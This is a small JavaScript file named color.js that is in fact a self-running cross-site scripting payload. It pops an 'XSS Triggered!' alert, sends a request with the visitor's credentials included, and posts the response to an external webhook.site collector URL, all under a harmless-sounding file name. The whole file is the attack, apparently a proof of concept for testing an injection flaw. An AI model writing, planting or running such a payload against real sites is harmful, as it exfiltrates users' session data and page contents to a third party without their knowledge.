// color.js
(function () {
  alert("XSS Triggered!");
  fetch("https://webhook.site/2a3874ec-1d9a-40c1-8e4f-ab8d8d3f8d0d?cookie=", {
    method: "GET",
    credentials: "include", // Include cookies in the request
  }).then((response) => {
    response.text().then((data) => {
      // Send the response back to your server
      fetch(
        "https://webhook.site/2a3874ec-1d9a-40c1-8e4f-ab8d8d3f8d0d?cookie=",
        {
          method: "POST",
          body: data,
        }
      );
    });
  });
})();
